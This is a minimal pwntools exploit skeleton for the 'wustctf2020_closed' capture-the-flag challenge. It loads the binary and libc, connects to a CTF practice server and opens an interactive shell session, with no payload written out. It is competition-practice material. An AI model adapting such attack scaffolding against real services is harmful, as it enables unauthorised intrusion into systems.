#+++++++++++++++++++exp.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Sun Nov 15 12:21:30 CST 2020
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./wustctf2020_closed')
#libc = ELF('null')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

#sh = process('./wusctf2020_closed')
sh = remote('node3.buuoj.cn',27488)




sh.interactive()
